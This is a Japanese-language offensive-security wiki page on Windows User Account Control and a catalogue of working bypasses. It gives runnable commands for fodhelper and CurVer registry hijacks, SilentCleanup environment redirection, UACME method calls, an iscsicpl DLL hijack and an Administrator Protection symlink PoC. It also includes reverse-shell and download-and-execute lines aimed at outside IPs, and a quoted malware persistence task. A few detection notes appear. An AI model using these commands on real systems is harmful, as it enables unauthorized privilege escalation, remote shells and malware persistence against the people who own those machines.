# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**権限昇格された操作に対する同意プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` レベルがあり、**high level** のプログラムは、**システムを侵害する可能性のあるタスク**を実行できます。UAC が有効な場合、管理者がこれらのアプリケーションやタスクに対してシステムへの administrator-level access を明示的に許可して実行させない限り、アプリケーションとタスクは常に **non-administrator account のセキュリティコンテキストで実行**されます。これは管理者を意図しない変更から保護する convenience feature ですが、security boundary とは見なされません。<sup>[[2]](#references)</sup>

integrity levels の詳細:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が有効な場合、administrator user には 2 つの token が付与されます。通常の操作を medium integrity で実行する standard user token と、admin privileges を持つ token です。

この [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) では、logon process、user experience、UAC architecture を含め、UAC の仕組みについて詳しく説明されています。<sup>[[2]](#references)</sup> Administrators は security policies を使用して、組織に合わせた UAC の動作を local level（secpol.msc を使用）で設定したり、Active Directory domain environment の Group Policy Objects (GPO) を介して設定・配布したりできます。各種設定については [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) で詳しく説明されています。UAC には設定可能な Group Policy settings が 10 個あります。以下の table に詳細を示します。

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: built-in Administrator account の Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Admin Approval Mode の administrators に対する elevation prompt の動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: standard users に対する elevation prompt の動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: application installations の検出と elevation prompt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: signed and validated executables のみを elevate](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: secure locations にインストールされた UIAccess applications のみを elevate](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: すべての administrators を Admin Approval Mode で実行](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: secure desktop を使用せずに UIAccess applications が elevation prompt を表示することを許可](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: elevation prompt の表示時に secure desktop に切り替え](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: file と registry への書き込み失敗を per-user locations に virtualize](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows で software をインストールするための Policies

**local security policies**（ほとんどのシステムでは `"secpol.msc"`）は、デフォルトで **non-admin users による software installations を防止**するよう設定されています。つまり、non-admin user が software の installer を download できたとしても、admin account なしでは実行できません。

### UAC に elevation を要求させる Registry Keys

admin rights を持たない standard user として、特定の操作を実行しようとした際に **「standard」account が UAC によって credentials を要求される**ようにできます。この操作には特定の **registry keys** の変更が必要であり、そのためには admin permissions が必要です。ただし、**UAC bypass** が存在する場合、または attacker がすでに admin としてログインしている場合は別です。

user が **Administrators** group に所属している場合でも、これらの変更によって administrative actions を実行するために **account credentials を再入力**する必要が生じます。

**実際には、すでに elevated token、UAC bypass、またはこれらの keys を変更できる misconfiguration を持っている場合にのみ有用です。それ以外の場合、registry write 自体がブロックされます。**

変更する必要がある registry keys と entries は以下のとおりです（括弧内は default values）。

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

これは Local Security Policy tool から手動で行うこともできます。変更後、administrative operations を実行すると、user に credentials の再入力が求められます。

### Note

**User Account Control は security boundary ではありません。** したがって、standard users は local privilege escalation exploit なしに自分の accounts から抜け出して administrator rights を取得することはできません。

### user に「full computer access」を要求する
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode は、integrity checks を使用して、high-integrity-level のプロセス（web browsers など）が low-integrity-level のデータ（temporary Internet files folder など）にアクセスするのを防ぎます。これは、browser を low-integrity token で実行することで行われます。browser が low-integrity zone に保存されたデータへアクセスしようとすると、operating system はプロセスの integrity level を確認し、それに応じてアクセスを許可します。この機能により、remote code execution attacks がシステム上の機密データへアクセスするのを防ぎます。
- ユーザーが Windows に log on すると、システムはユーザーの privileges の一覧を含む access token を作成します。Privileges は、ユーザーの rights と capabilities の組み合わせとして定義されます。token にはユーザーの credentials の一覧も含まれます。これらの credentials は、ユーザーをコンピューターおよびネットワーク上のリソースに対して authenticate するために使用されます。

### Autoadminlogon

Windows が startup 時に特定のユーザーへ自動的に log on するよう設定するには、**`AutoAdminLogon` registry key** を設定します。これは kiosk environments や testing purposes に便利です。registry に password が露出するため、安全なシステムでのみ使用してください。

Registry Editor または `reg add` を使用して、以下の keys を設定します。

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

通常の logon 動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> victim への graphical access がある場合、UAC bypass は非常に簡単です。UAC prompt が表示されたときに "Yes" をクリックするだけでよいためです。

UAC bypass は、次の状況で必要になります。**UAC が有効で、プロセスが medium integrity context で実行されており、ユーザーが administrators group に所属している場合です。**

**UAC が最高の security level（Always）に設定されている場合は、他の levels（Default）に設定されている場合よりも bypass がはるかに困難である**ことに注意してください。

### Fast triage from a medium-integrity shell

bypass を試す前に、適切なシナリオであることを確認し、host build を既知の動作する methods に対応付けます。
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
実用上の注意:
- `EnableLUA=0` の場合、bypass は不要です。任意の admin token から直接 high integrity を要求できます。
- `ConsentPromptBehaviorAdmin=2` または `5` は、auto-elevate / COM-based bypasses の一般的なシナリオです。
- `Always Notify` にするとハードルは上がりますが、失敗すると決めつけず、対象の正確な build でテストすべきです。UACME は、現代の Windows build でも `AlwaysNotify compatible` な手法をいくつか追跡しています。<sup>[[3]](#references)</sup>

### UAC 無効

UAC がすでに無効（`ConsentPromptBehaviorAdmin` が **`0`**）になっている場合、次のような方法で **admin privileges を持つ reverse shell**（high integrity level）を実行できます。
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### token duplication による UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC「bypass」（ファイルシステムへの完全なアクセス）

Administrators group に所属するユーザーの shell を取得している場合、SMB（ファイルシステム）経由で共有されている **C$** を新しいディスクにローカルで mount でき、**ファイルシステム内のすべてにアクセス**できます（Administrator の home folder も含む）。

> [!WARNING]
> **この trick はもう機能しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with Cobalt Strike

The Cobalt Strike techniques will only work if UAC is not set at its max security level
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には、**UAC** を **bypass** するためのモジュールもいくつかあります。

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects は、modern builds でも実用的な UAC attack surface であり続けています。`ICMLuaUtil` は current Windows branches で動作するものとして UACME に引き続き追跡されており、offensive tooling は、COM Elevation Moniker を呼び出す前に interactive desktop process、64-bit execution、場合によっては PEB/process masquerading を組み合わせることで、`CMSTPLUA` への対応を継続的に適応させています。<sup>[[3]](#references)</sup>

Practical tips:
- ユーザーの **interactive session** にある **64-bit** process（一般的には `explorer.exe` またはその child）を優先します。
- raw shell が失敗した場合は、naive な `CreateProcess` wrapper ではなく、BOF / UACME implementation から再試行します。
- child execution は **separate elevated process** で実行されることを想定してください。多くの BOF は現在の beacon を in-place で elevate しません。

### KRBUACBypass

Documentation と tool は [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) にあります。

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) は、UAC bypass techniques の collection です。Visual Studio または MSBuild で compile します。build によって複数の executable（例: `Source\Akagi\output\x64\Debug\Akagi.exe`）が作成されるため、target build に適した method を選択してください。<sup>[[3]](#references)</sup>\
注意してください。一部の bypass は、ユーザーに警告を与える可能性のある visible programs や prompts を起動します。<sup>[[3]](#references)</sup>

UACME には、各 technique が動作し始めた **build version** が記載されています。<sup>[[3]](#references)</sup> 自分の versions に影響する technique を検索できます。
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[このページ](https://en.wikipedia.org/wiki/Windows_10_version_history)を使用すると、ビルドバージョンから Windows リリース `1607` を取得できます。

実践的なワークフローでは、まず**ホストのビルドを判定**し、その後に一致する method を実行します：
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` はローカルの build と既知の UAC methods をすばやく比較するため、使えなくなった PoC を迅速に除外するのに役立ちます。<sup>[[4]](#references)</sup>
- `UACME` は、bypass を正確な build に対応付けるための、現在も最良の公開 catalogue です。Version 3.7.1 では methods 83–85 が追加され、その前の release では既存の methods が **Windows 11 25H2** に対して再テストされました。古い PoC が変更なしで引き続き適用できると仮定せず、method table と release notes を再確認してください。<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify 対応 WNF/UIAccess chains (UACME 3.7.1)

`Always Notify` によって、すべての UAC bypass が排除されるわけではありません。UACME 3.7.1 には、user-controlled な environment/protocol state と、elevated scheduled-task または UIAccess の挙動を組み合わせる 3 つの新しい x64 methods が実装されており、すべて `AlwaysNotify compatible` とされています。<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot` を redirect し、WNF によって trigger される `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` に elevated な `taskhostw.exe` の `unifiedconsent.dll` side-load を実行させます。UACME では Windows 10 build 19041 以降が対象です。
- **84 — TabTip:** 同じ environment-variable primitive を UIAccess `TabTip.exe` に対して使用します。build に応じて `windows.storage.dll`、`ApplicationTargetedFeatureDatabase.dll`、または `rsaenh.dll` を load した後、生成された high-integrity UIAccess context から pivot します。UACME では Windows 8.1 / Server 2016 以降が対象です。
- **85 — Narrator:** per-user の `feedback-hub` protocol を hijack し、`Alt+CapsLock+F` で Narrator を操作した後、`OskSupport.dll` を side-load する writable な `osk.exe` の copy を launch します。これは interactive desktop が必要で、Windows 10 1809 / Server 2019 以降が対象です。

UACME のドキュメントに従って payload units と Akagi を build した後、対応する method number を invoke します（optional command の default は `cmd.exe` です）。
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 と 85 は UIAccess/desktop interaction に依存するため、Session 0 や non-interactive service shell から変更せずに実行できるとは考えないでください。3 つすべてが environment/protocol state を操作し、DLL を配置します。テスト後に実装を確認し、これらの痕跡を削除してください。<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

trusted binary である `fodhelper.exe` は、modern Windows では auto-elevated されます。起動時に、`DelegateExecute` verb を検証せず、以下の per-user registry path を照会します。そこに command を仕込むことで、Medium Integrity process（user が Administrators に所属）が、UAC prompt なしで High Integrity process を起動できます。

fodhelper が照会する Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell steps（payloadを設定してからtrigger）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
注:
- 現在のユーザーが Administrators のメンバーで、UAC レベルがデフォルト/緩やかな設定の場合に動作します（追加の制限がある Always Notify では動作しません）。
- 64-bit Windows 上で 32-bit プロセスから 64-bit PowerShell を起動するには、`sysnative` パスを使用します。
- Payload には任意のコマンド（PowerShell、cmd、または EXE のパス）を指定できます。ステルス性を保つには、UI の表示を促すものは避けてください。

#### CurVer/extension hijack バリアント（HKCU のみ）

`fodhelper.exe` を悪用する最近のサンプルでは、`DelegateExecute` を使用せず、per-user の `CurVer` 値を介して **`ms-settings` ProgID をリダイレクト**します。auto-elevated binary は引き続き `HKCU` 配下で handler を解決するため、キーを配置するのに admin token は必要ありません:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
昇格後、malwareは通常、`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` を `0` に設定して**今後のプロンプトを無効化**し、その後さらに defense evasion（例：`Add-MpPreference -ExclusionPath C:\ProgramData`）を実行して、高い整合性レベルで実行されるよう persistence を再作成します。一般的な persistence タスクでは、**XOR暗号化された PowerShell script**をディスク上に保存し、1時間ごとにメモリ上で復号して実行します:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
この variant でも dropper をクリーンアップし、staged payloads だけを残すため、検出には **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` の tampering、Defender exclusion の作成、またはメモリ内で PowerShell を復号する scheduled tasks の監視が必要になります。<sup>[[5]](#references)</sup>

### `SilentCleanup` task による UAC bypass（`HKCU\Environment\windir`）

`SilentCleanup` は最高権限で `cleanmgr.exe` を起動し、ユーザー環境変数から `%windir%` を展開します。`HKCU\Environment\windir` を制御できる場合、この展開先を任意の command にリダイレクトし、consent dialog なしで high integrity を取得できます。<sup>[[8]](#references)</sup> UACME がこの technique を引き続き有効にしており、最近の issue tracking でも Windows 11 24H2 では quoting の小さな調整だけで済む可能性が示されているため、この method は最近の builds でもテストする価値があります。<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
その build でタスクがパスを引用する場合は、payload の末尾に引用符を付けて再試行します（例: `cmd.exe"`）。テスト後は必ず `HKCU\Environment\windir` を cleanup してください。

#### さらなる UAC bypass

UI flow、COM object、または desktop interaction を悪用する classic UAC bypass の多くは、victim の **full interactive session** を必要とします。通常の `nc.exe` shell や **Session 0** で実行されている service では不十分なことがよくあります。

これは **meterpreter** session を使うことで解決できる場合があります。**Session** value が **1** と等しい **process** に migrate してください：

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ should works)

### GUI を使用した UAC Bypass

**GUI にアクセスできる場合、UAC prompt が表示されたときに accept するだけでよい**ため、technical bypass は実際には必要ありません。そのため、GUI session を取得できれば、UAC による実用上の障害を回避できることがよくあります。

さらに、誰かが使用していた GUI session（RDP 経由の可能性があります）を取得した場合、**administrator として実行されているツールが存在することがあり**、そこから例えば **cmd** を **admin として run** できます。この場合、[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) のように、UAC による再度の prompt を表示させずに実行できます。こちらの方が多少 **stealthy** かもしれません。

### Noisy brute-force UAC bypass

noise が許容される場合は、[**ForceAdmin**](https://github.com/Chainski/ForceAdmin) のような tool を使って、user が accept するまで elevation を繰り返し要求できます。

### 独自の bypass - Basic UAC bypass methodology

**UACME** を確認すると、**多くの UAC bypass が DLL hijacking を悪用している**ことに気付くでしょう（多くの場合、elevated binary に writable path から attacker-controlled DLL を load させます）。[DLL hijacking vulnerability の見つけ方はこちら](../windows-local-privilege-escalation/dll-hijacking/index.html)を読んでください。

1. **autoelevate** する binary を見つけます（実行時に high integrity level で動作することを確認します）。
2. procmon を使用して、**DLL Hijacking** に対して vulnerable な "**NAME NOT FOUND**" event を見つけます。
3. おそらく、書き込み権限のない **protected paths**（C:\Windows\System32 など）に DLL を **write** する必要があります。これを次の方法で bypass できます：
1. **wusa.exe**: Windows 7、8、8.1。high integrity level で実行される tool であるため、CAB file の内容を protected paths 内に extract できます。
2. **IFileOperation**: Windows 10。
4. DLL を protected path 内に copy し、vulnerable かつ autoelevated な binary を実行する **script** を準備します。

### 別の UAC bypass technique

**autoElevated binary** が、実行する **binary** または **command** の **name/path** を **registry** から **read** しようとするかを監視します（binary がこの情報を **HKCU** 内から検索する場合は、より興味深い結果になります）。

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack による UAC bypass

32-bit の `C:\Windows\SysWOW64\iscsicpl.exe` は **auto-elevated** binary であり、search order によって `iscsiexe.dll` を load させるために悪用できます。malicious な `iscsiexe.dll` を **user-writable** folder 内に配置し、現在の user の `PATH`（例えば `HKCU\Environment\Path` 経由）を変更してその folder が検索されるようにすると、Windows は **UAC prompt を表示せずに** attacker DLL を elevated `iscsicpl.exe` process 内へ load する可能性があります。<sup>[[1]](#references)[[6]](#references)</sup>

実践上の注意：
- これは、現在の user が **Administrators** に所属しているものの、UAC により **Medium Integrity** で実行されている場合に有用です。
- この bypass で relevant なのは **SysWOW64** copy です。**System32** copy は別の binary として扱い、動作を独立して検証してください。
- この primitive は **auto-elevation** と **DLL search-order hijacking** の組み合わせです。そのため、他の UAC bypass に使用する ProcMon workflow と同じ方法で、missing DLL load を検証できます。

Minimal flow：
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
検知のアイデア:
- `reg add` / `HKCU\Environment\Path` へのレジストリ書き込みの直後に、`C:\Windows\SysWOW64\iscsicpl.exe` が実行されていないかアラートする。
- `%TEMP%` や `%LOCALAPPDATA%\Microsoft\WindowsApps` など、**ユーザーが制御可能な**場所にある `iscsiexe.dll` を調査する。
- `iscsicpl.exe` の起動と、想定外の子プロセスや通常の Windows ディレクトリ外からの DLL load を関連付ける。

### 個別に確認する価値がある新しい research

2024 年以降の一部の chain は、従来の `HKCU\Software\Classes` レジストリ hijack とは異なる外観になっています。例えば、activation-context cache poisoning では、**drive remap** と **DLL redirection** を chain し、`ctfmon.exe` や後続の `fodhelper.exe` など、trusted UI / auto-elevated binary を通じて medium integrity から high integrity へ移行できます。ここで大規模な PoC を重複して掲載する代わりに、以下にある簡潔な payload の例を確認してください。

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) の per-logon-session DOS device map を介した drive-letter hijack

> [!NOTE]
> 2026 年 8 月時点で、Microsoft は Administrator Protection を引き続き **Insider preview** として文書化しています。2025 年 10 月の rollout は撤回され、後日実施される予定です。これらの chain をテストする前に、**Admin Approval Mode with Administrator protection** が実際に有効化され、デバイスが再起動済みであることを確認してください。標準の 25H2 version string だけでは、この機能が有効であることは証明できません。<sup>[[10]](#references)</sup>

Windows 11 25H2 preview build における `RAiLaunchAdminProcess` / UIAccess attack surface の全体については、専用ページを確認してください。

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 の「Administrator Protection」は、per-session の `\Sessions\0\DosDevices/<LUID>` map を持つ shadow-admin token を使用します。この directory は、最初の `\??` resolution 時に `SeGetTokenDeviceMap` によって lazy に作成されます。攻撃者が shadow-admin token を **SecurityIdentification** のみで impersonate した場合、directory は攻撃者を **owner** として作成されます（`CREATOR OWNER` を継承するため）。これにより、`\GLOBAL??` より優先される drive-letter link が可能になります。<sup>[[7]](#references)</sup>

**手順:**

1. low-privileged session から `RAiProcessRunOnce` を呼び出し、promptless な shadow-admin `runonce.exe` を spawn する。
2. その primary token を **identification** token に duplicate し、`\??` を開く間 impersonate して、`\Sessions\0\DosDevices/<LUID>` を攻撃者の ownership で強制的に作成する。
3. そこに攻撃者が制御する storage を指す `C:` symlink を作成する。その後、その session 内の filesystem access では `C:` が攻撃者の path に resolve され、prompt なしで DLL/file hijack が可能になる。

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
プレビュー ホストでは、Administrator Protection は `Microsoft-Windows-LUA` プロバイダーの下で、承認と失敗を ETW イベント **15031** および **15032** として記録します。イベントには、要求元 SID、アプリケーション パス、結果、管理対象の administrator アカウント、認証方法が含まれるため、繰り返される exploit の試行や失敗した UI 操作は telemetry-free ではありません。<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control の仕組み](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques のコレクション](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 東南アジア政府の標的に対する0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection の bypass](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task を使用した UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent、TabTip、Narrator の Always Notify bypasses](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
